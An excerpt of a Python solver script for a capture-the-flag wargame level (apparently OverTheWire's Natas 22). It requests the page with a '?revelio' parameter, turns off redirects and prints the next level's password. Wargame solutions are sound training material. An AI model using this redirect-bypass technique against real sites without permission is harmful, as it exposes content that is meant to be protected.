...
def getpass(url, auth, session, proxies=None):
    ...
    url = url + "/?revelio"
    response = session.get(url, auth=auth, allow_redirects=False, proxies=proxies)
    ...
    print(f"[+] The password of natas23 is: {passwd[1]}")


def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Grabs the password of natas23 by sending an empty parameter and disallow redirect.")
    parser.add_argument('-p', '--password', help='Password of natas22.', required=True, metavar='Password')
